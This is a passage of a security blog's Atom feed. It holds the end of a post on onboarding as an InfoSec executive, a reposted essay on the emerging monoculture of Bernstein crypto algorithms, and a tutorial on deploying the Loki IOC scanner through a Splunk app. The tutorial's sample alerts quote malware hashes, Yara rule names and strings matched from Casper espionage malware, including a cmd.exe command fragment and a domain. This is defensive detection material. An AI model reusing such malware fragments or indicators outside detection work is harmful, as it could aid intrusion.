        <p>Define scope and develop metrics.  Emphasize collaboration and plan presentation.  If there is a solid lead peer, have them QA.  If needed, create job descriptions.  Ensure to make it clear strong writing and presentation skills are key for non-IC roles.</p>
      </li>
      <li>
        <p>Identify underperforming personnel and develop skills.  Remember, it isn’t their fault if they fail.  It is your fault for setting them up to fail.  Allowing non-exceptional performance will damage the business objectives and demotivate the team.  Most likely, they need some guidance and direction to find their niche.  Assist in creating skill improvement plans with effective use of the resources and projects available.</p>
      </li>
    </ul>
  </li>
  <li>
    <p>Get involved in current projects</p>

    <ul>
      <li>It would be stunning if you didn’t inherit prior programs and projects.  You should have a bit of spare time by now to add value.  Do not attempt to take over a project or undervalue a skill. I am certain we all have been there when we think someone thinks little of us when CC’ing their manager, your manager, etc.…  Two expected outcomes from this – keep focused on the business value and keep executive succinct, smarter / not harder, and effective.  Ensure no one leaves with a “winner” or “looser” thought</li>
    </ul>
  </li>
  <li>
    <p>Program Charter Approval</p>

    <ul>
      <li>Ensure Upper Mgt. sponsorship and approval for the charter.  Schedule face-to-face meetings and read the non-verbal communications.  It is essential for the program to confirm what Upper Mgt. expects from you.  Also presents an opportunity to establish a close working relationship.</li>
    </ul>
  </li>
  <li>
    <p>Budget</p>

    <ul>
      <li>
        <p>Take a look at the next 6-12 months.  Highlight changes in green, yellow, and red.  Look for trends and outliers in the expense categories.  Most likely will be productive for financial savings.  Create a plan for cost reduction so you can put it out of your hat on a rainy day.</p>
      </li>
      <li>
        <p>Write a funding plan for the program’s first iteration.  Mainly will cover transformational work.  It is expected to be over and above the operating budget</p>
      </li>
    </ul>
  </li>
  <li>
    <p>Governance</p>

    <ul>
      <li>
        <p>Evaluate the effectiveness of any governance process – suggested to use the prior assessment as starting point.  You will walk away understanding effective decision making right – linked to accountability, responsibility, and authority</p>
      </li>
      <li>
        <p>Leverage supplemental resources from external providers when internal resources do not exist to drive action</p>
      </li>
      <li>
        <p>Take advantage specific individuals may be more flexible in offering assistance as they seek to influence you.  Beware, you may lose control of your soul in the future</p>
      </li>
    </ul>
  </li>
  <li>
    <p>Program specific action items – Based upon the needs of the business and organization.  Each institution is different as is their programs</p>
  </li>
</ul>

<p>Last – None</p>

<hr />

<h1 id="measurement-45-100">Measurement (45-100)</h1>

<p><strong><em>Outcome</em></strong></p>

<ul>
  <li>
    <p>Initial status report for Upper Mgt. and Executive Security / IA Committee</p>
  </li>
  <li>
    <p>Evidence of early progress and achievements</p>
  </li>
  <li>
    <p>Foundations of a reporting framework</p>
  </li>
  <li>
    <p>First Quarter status report</p>
  </li>
</ul>

<p>Key Communication Opportunities</p>

<ul>
  <li>
    <p>Highly Wins and Successes</p>

    <ul>
      <li>Schedule meetings with directs / indirects, mgr., and stakeholders to gather their thoughts on progress and challenges.  Collate the findings into a first quarter status report.  Report what is only relevant to the audience(s.)  Interpret the metrics and provide recommended courses of action</li>
    </ul>
  </li>
  <li>
    <p>Monitor program / project success</p>

    <ul>
      <li>Inherited vs. Initiated projects – Doesn’t matter.  Regular process reports should be brief and focus on the information you need to discuss with the audiences.  Keep TPMs / Project managers focused on telling you how they are doing, not what they are doing.  Ask occasional probing questions at greater levels of detail, to ensure you can articulate the business value of the project team’s efforts</li>
    </ul>
  </li>
</ul>

<p><strong><em>Specific, Measurable, Attainable, Relevant, and Timely Actions</em></strong></p>

<ul>
  <li>
    <p>See Key Communication Opportunities</p>
  </li>
  <li>
    <p>Program specific action items – Based upon the needs of the business and organization.  Each institution is different as is their programs</p>
  </li>
</ul>

<p>Last – None</p>

<h1 id="where-from-here">Where from Here?</h1>

<p>With that being said, the takeaways for your first 100 days;</p>

<ul>
  <li>
    <p>Maximize success by creating detailed plans for activities for the first months</p>
  </li>
  <li>
    <p>Set priorities carefully and avoid over commitment.  Try to start with the top five pressing issues and select two for the first 2-3 months.</p>
  </li>
  <li>
    <p>Stay away from technical unless it is absolutely required for the role or to earn respect.  Focus on the relationship of security to the business units</p>
  </li>
  <li>
    <p>Significant amounts of your time will be spent in a reactive manner handling unpredictable events or other peoples’ lack of planning is now your emergency</p>
  </li>
  <li>
    <p>Lastly, it goes without saying to never say anything negative of the predecessor’s implemented roadmaps and actions in front of peers, stakeholders, or team</p>
  </li>
</ul>]]></content>
    <author>
      <name>John W8MEJ Menerick</name>
    </author>
    <category term="Infosec"/>
    <category term="Leadership"/>
    <category term="Executive Onboarding"/>
    <category term="Security Programs"/>
    <category term="Blue Team"/>
    <category term="Red Team"/>
    <category term="AppSec"/>
    <category term="Org Theory"/>
    <summary type="html"><![CDATA[A friend took up a new InfoSec executive career path but didn't know how to start. She reached out to me and ask for my thoughts. I thought about it]]></summary>
  </entry>
  <entry>
    <title type="html">The pending crypto singularity</title>
    <link href="https://www.securesql.info/2018/01/16/crypto-singularity/" rel="alternate" type="text/html" title="The pending crypto singularity"/>
    <published>2018-01-16T00:00:00-08:00</published>
    <updated>2018-01-16T00:00:00-08:00</updated>
    <id>https://www.securesql.info/2018/01/16/crypto-singularity</id>
    <content type="html" xml:base="https://www.securesql.info/2018/01/16/crypto-singularity/"><![CDATA[<p>Recently penned by Peter, it is worth a read.  Especially for those who are
concerned about putting all of their eggs in one basket.</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>On the Impending Crypto Monoculture
===================================

A number of IETF standards groups are currently in the process of applying the
second-system effect to redesigning their crypto protocols.A major feature
of these changes includes the dropping of traditional encryption algorithms
and mechanisms like RSA, DH, ECDH/ECDSA, SHA-2, and AES, for a completely
different set of mechanisms, including Curve25519 (designed by Dan Bernstein
et al), EdDSA (Bernstein and colleagues), Poly1305 (Bernstein again) and
ChaCha20 (by, you guessed it, Bernstein).

What's more, the reference implementations of these algorithms also come from
Dan Bernstein (again with help from others), leading to a never-before-seen
crypto monoculture in which it's possible that the entire algorithm suite used
by a security protocol, and the entire implementation of that suite, all
originate from one person.

How on earth did it come to this?

The Underlying Problem
----------------------

It would be easy to dismiss the wholesale adoption of Bernstein algorithms and
code as rampant fanboyism, and indeed there is some fanboyism present.An
example of this is the interpretation of the data formats to use as "whatever
Dan's code does" rather than the form specified in widely-adopted standards
like X9.62 ("Additional Elliptic Curves (Curve25519 etc) for TLS ECDH key
agreement", TLS WG discussion), something that hasn't been seen since the C
language was defined as "whatever the pcc compiler accepts as input".

The underlying problem, though, is far more complex.

In adopting the Bernstein algorithm suite and its implementation, implementers
have rejected both the highly brittle and failure-prone current algorithms and
mechanisms and their equally brittle and failure-prone implementations.

Consider the simple case of authenticated encryption as used in the major
Internet security protocols TLS, SSH, PGP, and S/MIME (the remaining protocol
would be IPsec, but I've never written an IPsec implementation so I don't have
sufficient hands-on experience with it to comment on it in practice).S/MIME
has an authenticated-encryption mode (encrypt-then-MAC or EtM) that's
virtually never used or even implemented, PGP has a sort-of integrity-check
mode that encrypts a hash of the plaintext in CFB mode, and both TLS and SSH
use the endlessly failure-prone MAC-then-encrypt (MtE) mode, with an ever-
evolving suite of increasingly creatively-named attacks stretching back 15
years or more (TLS recently adopted, after a terrific struggle on their
mailing list, an option to use EtM, but support in some major implementations
is still lagging).

What are the (standardised) alternatives?Looking through a recent paper from
Real World Crypto ("The Evolution of Authenticated Encryption", Phil Rogaway),
we see the three options GCM, CCM, and OCB.The GCM slide provides a list of
pros and cons to using GCM, none of which seem like a terribly big deal, but
misses out the single biggest, indeed killer failure of the whole mode, the
fact that if you for some reason fail to increment the counter, you're sending
what's effectively plaintext (it's recoverable with a simple XOR).It's an
incredibly brittle mode, the equivalent of the historically frighteningly
misuse-prone RC4, and one I won't touch with a barge pole because you're one
single machine instruction away from a catastrophic failure of the whole
cryptosystem, or one single IV reuse away from the same.This isn't just
theoretical, it actually happened to Colin Percival, a very experienced crypto
developer, in his backup program tarsnap.You can't even salvage just the
authentication from it, that fails as well with a single IV reuse
("Authentication Failures in NIST version of GCM", Antoine Joux).

Compare this with old-fashioned CBC+HMAC (applied in the correct EtM manner),
in which you can arbitrarily misuse the IV (for example you can forget to
apply it completely) and the worst that can happen is that you drop back to
ECB mode, which isn't perfect but still a long way from the total failure that
you get with GCM.Similarly, HMAC doesn't fail completely due to a minor
problem with the IV.

Then there's CCM, which is two-pass and therefore an instant fail for
streaming implementations, which is all of the protocols mentioned earlier
(since CCM was designed for use in 802.11 which has fixed maximum-size packets
this isn't a failure of the mode itself, but does severely limit its
applicability).

The remaining mode is OCB, which I'd consider the best AEAD mode out there (it
shares CBC's graceful-degradation property in which reuse or misuse of the IV
doesn't lead to a total loss of security, only the authentication property
breaks but not the confidentiality).Unfortunately it's patented, and even
though there are fairly broad exceptions allowing it to be used in many
situations, the legal minefield that ensues makes it untouchable for most
potential users.For example does the prohibition on military use cover the
situation where an open-source crypto package is used in a vendor library
that's used in a medical insurance app that's used by the US Navy, or where
banking transactions protected by TLS may include ones of a military nature
(both of these are actual examples that affected decisions not to use OCB).
Since no-one wants to call in lawyers every time a situation like this comes
up, and indeed can't call in lawyers when the crypto is several levels away in
the service stack, OCB won't be used even though it may be the best AEAD mode
out there.

(The background behind this problem can be found in Phil Rogaway's excellent
essay "The Moral Character of Cryptographic Work", which discusses aligning
crypto work with principles like the Buddhist concept of right livelihood,
applying it in an ethical manner.Unfortunately, in the same way that the
current misguided attempts by politicians to limit mostly non-existent use of
crypto by terrorists and other equestrians only affects legitimate users (the
few terrorists who may actually bother with encryption won't care), so the
restriction of OCB, however well-intentioned, have the effect that a beautiful
AEAD mode that should be used everywhere is instead used almost nowhere).

The implementations of the algorithms aren't much better.Alongside brittle,
failure-prone crypto modes and mechanisms, we also have brittle, failure-prone
implementations.The most notorious of these is OpenSSL, which powers a
significant part of the world's crypto infrastructure not only directly (as a
TLS/SSL implementation) but also indirectly, when it's used as a component of
other applications like OpenSSH.In fact one of the reasons given for
OpenSSH's adoption of the chacha20-poly1305 crypto mechanisms (alongside
Curve25519 and others) was that it finally allowed them to remove the last
vestiges of OpenSSL from their code.

The Reason for the Monoculture
------------------------------

Anyone who works with crypto on the Internet has had to endure 15-20 years of
constant breakage of the crypto they use, both of the algorithms and
mechanisms and of the implementations.It's not even possible to give
references for this because the list of breakage is so long and extensive that
it would take pages and pages just to enumerate it all.

Take for example an organisation like Google.Every single time that there's
been some break in a crypto mechanism, Google gets hit.Again and again, year
in, year out.So when they look to moving to ChaCha20 and Poly1305, it's not
Bernstein fanboyism, it's an attempt to dig themselves out of the current hole
where they get hit with a new attack every couple of months, and the breakage
just keeps recurring, endlessly.

What implementers are looking for is what Bernstein has termed boring crypto,
"crypto that simply works, solidly resists attacks, never needs any upgrades"
("Boring crypto", Dan Bernstein).Bernstein and colleagues offer a silver
bullet, something that appears better than anything else that's out there at
the moment.

In this they have no real competition.There's no AEAD mode that's usable,
the ECC algorithms and parameters that we're supposed to use are both tainted
due to NSA involvement and riddled with side-channels (the Bernstein
algorithms and mechanisms have been specifically designed to deal with both of
these issues), and so on.

Consider being lost in an endless desert.If you see an oasis in the
distance, you head towards it even if the water is brackish and has camel dung
floating in it.Bernstein et al are the oasis (or perhaps the mirage of an
oasis), in an endless desert of cryptosystems and implementations of
cryptosystems that keep breaking.

So the (pending) Bernstein monoculture isn't necessarily a vote for Dan, it's
more a vote against everything else.

Acknowledgements
----------------

This essay came about as the result of a discussion at AsiaCrypt 2015, and was
then developed with significant input from Lucky Green.Prior to publication,
further input was provided by some of the people whose work is mentioned in
it.
</code></pre></div></div>]]></content>
    <author>
      <name>John W8MEJ Menerick</name>
    </author>
    <category term="Cryptography"/>
    <category term="Security Engineering"/>
    <category term="Protocol Design"/>
    <category term="Crypto Monoculture"/>
    <category term="IETF"/>
    <category term="Internet Security"/>
    <category term="AEAD"/>
    <category term="Curve25519"/>
    <category term="Open Source"/>
    <summary type="html"><![CDATA[Recently penned by Peter, it is worth a read. Especially for those who are concerned about putting all of their eggs in one basket. On the Impending Crypto Monoculture]]></summary>
  </entry>
  <entry>
    <title type="html">Creating a Loki Splunk application</title>
    <link href="https://www.securesql.info/2017/10/10/loki-splunk-app/" rel="alternate" type="text/html" title="Creating a Loki Splunk application"/>
    <published>2017-10-10T00:00:00-07:00</published>
    <updated>2017-10-10T00:00:00-07:00</updated>
    <id>https://www.securesql.info/2017/10/10/loki-splunk-app</id>
    <content type="html" xml:base="https://www.securesql.info/2017/10/10/loki-splunk-app/"><![CDATA[<p>One tool that has caught my interest is the <a href="https://github.com/Neo23x0/Loki">Loki APT
scanner</a> created by <a href="http://bsk-consulting.de/">BSK
Consulting</a>, a cool scanner that combines
filenames, IP addresses, domains, hashes, Yara rules, Regin file system
checks, process anomaly checks, SWF decompressed scan, SAM dump checks, etc.
to find indicators of compromise on your system. From the Loki github page,
Loki currently includes the following IOC checks:</p>

<ul>
  <li>Equation Group Malware (Hashes, Yara Rules by Kaspersky and 10 custom rules generated by us)</li>
  <li>Carbanak APT - Kaspersky Report (Hashes, Filename IOCs - no service detection and Yara rules)</li>
  <li>Arid Viper APT - Trendmicro (Hashes)</li>
  <li>Anthem APT Deep Panda Signatures (not officialy confirmed) (krebsonsecurity.com - see Blog Post)</li>
  <li>Regin Malware (GCHQ / NSA / FiveEyes) (incl. Legspin and Hopscotch)</li>
  <li>Five Eyes QUERTY Malware (Regin Keylogger Module - see: Kaspesky Report)</li>
  <li>Skeleton Key Malware (other state-sponsored Malware) - Source: Dell SecureWorks Counter Threat Unit(TM)</li>
  <li>WoolenGoldfish - (SHA1 hashes, Yara rules) Trendmicro Report</li>
  <li>OpCleaver (Iranian APT campaign) - Source: Cylance</li>
  <li>More than 180 hack tool Yara rules - Source: APT Scanner THOR</li>
  <li>More than 600 web shell Yara rules - Source: APT Scanner THOR</li>
  <li>Numerous suspicious file name regex signatures - Source: APT Scanner THOR</li>
  <li>Much more … (cannot update the list as fast as I include new signatures)</li>
</ul>

<p>The challenge with Loki is that it can be very laborious to run and parse
Loki’s scan results across an enterprise to find the needle in a haystack . In
this post we’ll show how to write a Splunk app to automate running Loki,
parsing the results, and identifying what is important. But as an FYI, Loki is
a CLI-based program that has the ability to scan a folder, your system, etc.
for possible indicators of compromise. Basic Loki commands are:</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>usage: loki.exe [-h] [-p path] [-s kilobyte] [-l log-file] [-a alert-level]
[-w warning-level] [-n notice-level] [--printAll]
[--allreasons] [--noprocscan] [--nofilescan] [--noindicator]
[--reginfs] [--dontwait] [--intense] [--csv] [--onlyrelevant]
[--nolog] [--update] [--debug]

Loki - Simple IOC Scanner

optional arguments:
-h, --helpshow this help message and exit
-p path Path to scan
-s kilobyte Maximum file size to check in KB (default 2048 KB)
-l log-file Log file
-a alert-levelAlert score
-w warning-levelWarning score
-n notice-level Notice score
--printAllPrint all files that are scanned
--allreasonsPrint all reasons that caused the score
--noprocscanSkip the process scan
--nofilescanSkip the file scan
--noindicator Do not show a progress indicator
--reginfs Do check for Regin virtual file system
--dontwaitDo not wait on exit
--intense Intense scan mode (also scan unknown file types and all
extensions)
--csv Write CSV log format to STDOUT (machine prcoessing)
--onlyrelevantOnly print warnings or alerts
--nolog Don't write a local log file
--updateUpdate the signatures from the "signature-base" sub
repository
--debug Debug output
</code></pre></div></div>

<p>Before we begin with the steps to create the Splunk app, download the latest
Loki Windows binary from <a href="https://github.com/Neo23x0/Loki/releases">here</a>. For
the sake of this blog post we will only be focusing on running Loki in
Windows, but the functionality can easily be extended to all operating
systems. Once downloaded, run the command “<em>loki.exe –update</em> “ to download
the latest IOC files into the folder “<em>signature-base</em> “ that will be used
later.</p>

<p>On a side note, if you would like to further update your IOCs to include
Alienware malicious IPs and domains and <a href="http://www.misp-project.org/">MISP</a>
IOCs, use the signature update files located in “<em>signature-base\threatintel</em>
“._ _ You will require an API key from <a href="https://otx.alienvault.com/api/">Alienvault Open Threat
Exchange</a> (OTX), and a MISP API key from a
running <a href="http://www.misp-project.org/communities/">MISP instance</a>. The
AlienVault API key is easy to get, the MISP instance is a little more
difficult. In any case, once you have your keys you can write a script that
updates either or both services and schedule a Cron job with the following
commands:</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code># Update AlienVault OTX:
**_python get-otx-iocs.py -k &lt;API_KEY&gt;_**

# Update MISP:
**_python get-misp-iocs.py -k &lt;API_KEY&gt; -u &lt;URL&gt;_**
</code></pre></div></div>

<p>Now that we have an updated Loki executable and signatures we are ready to
create the Splunk App directory structure. In your Splunk Deployment Server
create the following directories and files:</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>The following 
$SPLUNK_HOME/etc/deployment-apps/Splunk_App_loki
├── bin
| ├── config\
| ├── excludes.cfg
| ├── signature-base\*
| ├── loki.bat
| └── loki.exe
├── default
| ├── app.conf
| ├── indexes.conf
| ├── props.conf
| ├── transforms.conf
| └── inputs.conf
├── metadata
| └── default.meta
</code></pre></div></div>

<p>Now that we have our directory structure, there are a couple of default files
that will need to be created that we’ll run through quickly:<br />
1)**  $SPLUNK_HOME\etc\deployment_apps\Splunk_App_loki\bin\signature-base\***</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code># Copy the folder and its content created via the command "_loki.exe --update_ "to the specified folder.
</code></pre></div></div>

<p>2)**
$SPLUNK_HOME\etc\deployment_apps\Splunk_App_loki\bin\config**<a href="https://github.com/Neo23x0/Loki/blob/master/config/excludes.cfg">excludes.cfg</a><br />
This is actually a Loki default file, but should be included none the less.</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code># Excluded directories
#
# Ensure that you have the latest file from the excludes.cfg URL above.
#
# - add directories you want to exclude from the scan
# - double escape back slashes
# - values are case-insensitive
# - remember to use back slashes on Windows and slashes on Linux / Unix / OSX
# - each line contains a regex that matches somewhere in the full path (case insensitive)
# e.g.:
# Regex: \\System32\\
# Matches C:\Windows\System32\cmd.exe
#
# Regex: /var/log/[^/]+\.log
# Matches: /var/log/test.log
# Not Matches: /var/log/test.gz
#

# Useful examples (google "antivirus exclusion recommendations" to find more)
\\Ntfrs\\
\\Ntds\\
\\EDB[^\.]+\.log
Sysvol\\Staging\\Nntfrs_cmp
\\System Volume Information\\DFSR
</code></pre></div></div>

<p>**
<em>$SPLUNK_HOME\etc\deployment_apps\Splunk_App_loki\default[app.conf](http://docs.splunk.com/Documentation/Splunk/latest/Admin/Appconf)</em>**<br />
The app.conf file maintains the state of a given app in Splunk Enterprise. It
may also be used to customize certain aspects of an app.</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>## Splunk app configuration file

[install]
is_configured = true
state = enabled

[launcher]
author = epicism
version = 1.0
description = Technology Add-on for the Loki APT Scanner

[ui]
is_visible = false
label = Technology Add-on for Loki APT Scanner

[package]
id = Splunk_App_loki
</code></pre></div></div>

<p><strong><em>$SPLUNK_HOME\etc\deployment_apps\Splunk_App_loki\metadata[default.meta](http://docs.splunk.com/Documentation/Splunk/latest/Admin/Defaultmetaconf)</em></strong><br />
The default.meta file contain ownership information, access controls, and
export settings for Splunk objects like saved searches, event types, and
views. Each app has its own default.meta file.</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>[]
access = read : [*], write: [ admin ]
export = system
</code></pre></div></div>

<p>Now that we have the default files out of the way we can create the Loki-
specific configuration files. First is the inputs.conf file that runs the
script that executes the loki.exe binary and reads the loki scan results.</p>

<p>** <em>$SPLUNK_HOME\etc\deployment_apps\Splunk__<strong>**_App_</strong>**
__loki\default[inputs.conf](http://docs.splunk.com/Documentation/Splunk/latest/Admin/Inputsconf)</em>**<br />
The inputs.conf file contains possible settings you can use to configure
inputs, distributed inputs such as forwarders, and file system monitoring in
inputs.conf.</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code># This is where you would place your signature update script if you created it:
# [script://$SPLUNK_HOME\etc\apps\loki\bin\signature-base\threatintel\updateintel.bat]
# disabled = true
# index = main
# interval = 30 1 * * *
# sourcetype = lokirun

# This entry runs the loki batch script and sends the script output to a null index.
# I could not get loki.exe's output to be ingested by Splunk when running it from this script,
# so I routed loki.exe's output to the $SPLUNK_HOME\...\loki.log in the next stanza.
[script://$SPLUNK_HOME\etc\apps\Splunk_App_loki\bin\loki.bat]
disabled = false
index = main
interval = 0 0 2 * * ?
sourcetype = lokirun
queueSize = 50MB

# The loki.bat batch script will save the loki.exe output to $SPLUNK_HOME\var\log\loki.log, and this reads it.
[monitor://$SPLUNK_HOME\var\log\splunk\loki.log]
disabled = false
index = loki
sourcetype = loki
</code></pre></div></div>

<p><strong><em>$SPLUNK_HOME\etc\deployment_apps\Splunk__****_App</em></strong>**
<em>_loki\bin\loki.bat</em>**<br />
This script moves its current working directory to the location of the script,
overwrites loki.log to ensure that it doesn’t grow endlessly and runs
loki.exe. “..\..\..\..\var\log\splunk" saves the output log in Splunk’s
log directory.</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>cd /d %~dp0
&gt; ..\..\..\..\var\log\splunk\loki.log echo.
start /low /d "%~dp0" loki.exe --reginfs --csv --dontwait --onlyrelevant --noindicator --intense -l ..\..\..\..\var\log\splunk\loki.log
</code></pre></div></div>

<p>The following files are the configuration files used by the Splunk Search Head
to parse the Loki log files. The Loki log files are supposed to be CSV format,
but only the first half of the values are, which required me to be creative
when parsing the event logs. Props.conf will parse the first half of the
properly CSV separated log, and transforms.conf parses the rest of the line.</p>

<p><strong><em>$SPLUNK_HOME\etc\deployment_apps\Splunk__****_App</em></strong>**
<em>_loki\default[props.conf](http://docs.splunk.com/Documentation/Splunk/latest/Admin/Propsconf)</em>**<br />
A little on Props.conf - it is commonly used for:</p>

<ul>
  <li>Configuring line breaking for multi-line events;</li>
  <li>Setting up character set encoding;</li>
  <li>Allowing processing of binary files;</li>
  <li>Configuring timestamp recognition;</li>
  <li>Configuring event segmentation;</li>
  <li>Overriding automated host and source type matching;</li>
  <li>Configure advanced (regex-based) host and source type overrides;</li>
  <li>Override source type matching for data from a particular source;</li>
  <li>Set up rule-based source type recognition;</li>
  <li>Rename source types;</li>
  <li>And so on…</li>
</ul>

<p>Props.conf is an integral part of a Splunk app, and I recommend that you read
the props.conf description in the URL above if you’re not familiar with it.</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code># This is for data that we don't want ingested to Splunk
[lokirun]
DATETIME_CONFIG = CURRENT
LINE_BREAKER = ([\r\n]+)
SHOULD_LINEMERGE = false
disabled = 0
TRANSFORMS-null= setnull

#This entry parses the loki.exe "CSV" output
[loki]
TIME_PREFIX = ^
TIME_FORMAT = %Y%m%dT%H:%M:%SZ
MAX_TIMESTAMP_LOOKAHEAD = 25
DATETIME_CONFIG = CURRENT
LINE_BREAKER = ([\r\n]+)
SHOULD_LINEMERGE = false
disabled = 0

# Example Log: 20170219T15:46:53Z,WIN-8J1HPPNE2HB,ALERT,FILE: C:\Users\x\Downloads\FlokiBot\64a23908ade4bbf2a7c4aa31be3cff24 SCORE: 100 TYPE: EXE SIZE: 400896 FIRST_BYTES: 4d5a90000300000004000000ffff0000b8000000 / MZ MD5: 64a23908ade4bbf2a7c4aa31be3cff24 SHA1: 2f87c2ce9ae1b741ac5477e9f8b786716b94afc5 SHA256: a4a810eebd2fae1d088ee62af725e39717ead68140c4c5104605465319203d5e CREATED: Tue Feb 07 13:45:11 2017 MODIFIED: Tue Feb 07 07:37:00 2017 ACCESSED: Tue Feb 07 13:45:11 2017REASON_1: Malware Hash TYPE: MD5 HASH: 64a23908ade4bbf2a7c4aa31be3cff24 SUBSCORE: 100 DESC: Flokibot Invades PoS: Trouble in Brazil https://www.arbornetworks.com/blog/asert/flokibot-invades-pos-trouble-brazil/
# EXTRACT-00-HEADER extracts the properly CSV values at the start of the log, and the REPORT-00-KEYVALUES transforms.conf entry parses the rest of the line.
EXTRACT-00-HEADER = ^(?&lt;DATE&gt;\d+)T(?&lt;TIME&gt;\d+:\d+:\d+)Z,(?&lt;HOSTNAME&gt;[^,]+),(?&lt;SEVERITY&gt;[^,]+),
# REPORT-00-KEYVALUES is responsible for parsing the remaining portion of the Loki event log not parsed by EXTRACT-00-HEADER. transforms.conf is good at parsing repeating values (such as "x=y" * z patterns), which is how Loki outputs its scan results.
REPORT-00-KEYVALUES = trans_keyvalues
</code></pre></div></div>

<p><strong><em>$SPLUNK_HOME\etc\deployment_apps\Splunk__****_App</em></strong>**
<em>_loki\default[transforms.conf](http://docs.splunk.com/Documentation/Splunk/latest/Admin/Transformsconf)</em>**<br />
A little on transforms.conf - it is commonly used for:</p>

<ul>
  <li>Configuring regex-based host and source type overrides;</li>
  <li>Anonymizing certain types of sensitive incoming data, such as credit card or social security numbers;</li>
  <li>Routing specific events to a particular index, when you have multiple indexes;</li>
  <li>Creating new index-time field extractions. NOTE: We do not recommend adding to the set of fields that are extracted at index time unless it is absolutely necessary because there are negative performance implications;</li>
  <li>And a lot more…</li>
</ul>

<p>Like props.conf, transforms.conf is an integral configuration file to an app
and I recommend that you read up on the URL to better understand the
configuration file’s function.</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code># This is supposed to remove Loki's process bar entries
[setnull]
REGEX = ^[\\\|\-\/\b]+$
DEST_KEY = queue
FORMAT = nullQueue

# This removes the loki.exe execution entry
[setnull2]
REGEX = ^.*?\\etc\\apps\\loki\\bin&gt;loki\.exe --reginfs --csv --dontwait --onlyrelevant --intense\s+$
DEST_KEY = queue
FORMAT = nullQueue

# "REGEX = XXX" parses the "key=value" pattern that isn't comma separated by performing a look ahead to detect the next "key=" entry. 
# FORMAT = $1::$2 tells Splunk that the key/value is to be formatted based on the first group that the regex extracts as the key, and the second group that the regex extracts as the value.
# Message me if you would like a deeper breakdown of how this works, and I would be happy to explain it.
[trans_keyvalues]
REGEX = ([\w\d]+):\s(.*?)(?=((\s[\d\w]+:\s)|$))
FORMAT = $1::$2
</code></pre></div></div>

<p>And that’s it! Simple, right? It may be overwhelming if you’re new to Splunk
apps, but the main thing that you should know is that inputs.conf runs
loki.bat (that runs loki.exe) and monitors for the loki.log file to be updated
with the scan results. props.conf parses the first half of the Loki event log,
and transforms.conf parses the rest. Hopefully this is helpful.</p>

<p>Now we have a full app in your Splunk deployment server, re-deploy your
deployment server apps using the command:</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$SPLUNK_HOME/bin/splunk reload deploy-server
</code></pre></div></div>

<p>Now you should be able to see Splunk_App_loki in your Deployment server. Go to
<em>Settings</em>  -&gt; <em>Forwarder Management</em>  -&gt; <em>Apps</em> , find <strong>Splunk_App_loki</strong>
and click <em><strong>Edit</strong></em>.</p>

<p>Once in the App configuration section select the <strong><em>Reset Splunk</em></strong>  checkbox
and select <strong><em>Save</em></strong>.</p>

<p>Next go to the <em>Server Class</em>  tab and create a new App by slicking <strong><em>New
Server Class</em></strong>.</p>

<p>Name it Loki_App_Class (or whatever you want) and click <strong><em>OK</em></strong>. This will
bring you to the Loki App Class screen:</p>

<p><em>Note, if you chose to create the Splunk_TA_loki app, you can perform the
same steps as above and add your search head to the clients list, or using the
cluster manager.</em></p>

<p>In the Apps section select of the page click <em>Edit</em>  to take you to the App
list page. Click on the <strong><em>Splunk_App_loki</em></strong> app in the left hand side list
to add it to the app class and click <strong><em>Save</em></strong> :</p>

<p>This will take you back to the Loki_App_Class page. Next you will add the
clients that you want to run the Loki APT scanner on. Click the <strong><em>Edit</em></strong>
button on the Clients section of the page to take you to the list of clients
(e.g. Splunk servers and Splunk Universal Forwarder servers). Add the Windows
clients that you want to run Loki on on a regular schedule by adding their
hostname to the _Include (whitelist)  _textbox and click the <strong><em>Save</em></strong>
button:</p>

<p>This will cause the clients in the Include (whitelist) of the  Loki_App_Class
to download, install and run the Loki app the next time they call in to the
deployment server every day at 2:00 AM, save the results to
“$SPLUNK_HOME\var\log\splunk\loki.log” and then ingest and parse the results
into Splunk, taking the following:</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>20170417T01:36:13Z,WIN-8J1HPPNE2HB,ALERT,FILE: C:\Program Files\SplunkUniversalForwarder\var\log\splunk\loki.log SCORE: 4630 TYPE: UNKNOWN SIZE: 281385 FIRST_BYTES: 32303137303431375430313a33333a33365a2c57 / 20170417T01:33:36Z,W MD5: 99bb9f6343fc69159a6e03e1ef8c6428 SHA1: 58bf43a5c0ec496e62f2217cfa789df35d1ea953 SHA256: 4e1feaa3b24529737fa5accda9beaa841fb259ed5474087aa1017f8427544c04 CREATED: Sun Apr 16 18:33:36 2017 MODIFIED: Sun Apr 16 18:34:46 2017 ACCESSED: Sun Apr 16 18:33:36 2017REASON_1: Yara Rule MATCH: GRIZZLY_STEPPE_Malware_2 SUBSCORE: 70 DESCRIPTION: Auto-generated rule - file 9acba7e5f972cdd722541a23ff314ea81ac35d5c0c758eb708fb6e2cc4f598a0 MATCHES: Str1: GoogleCrashReport.dll Str2: CrashErrors Str3: CrashSend Str4: CrashAddData Str5: CrashCleanup Str6: CrashInitREASON_2: Yara Rule MATCH: Casper_Included_Strings SUBSCORE: 50 DESCRIPTION: Casper French Espionage Malware - String Match in File - http://goo.gl/VRJNLo MATCHES: Str1: cmd.exe /C FOR /L %%i IN (1,1,%d) DO IF EXIST Str2: &amp; SYSTEMINFO) ELSE EXIT Str3: jpic.gov.sy Str4: perfaudio.dat


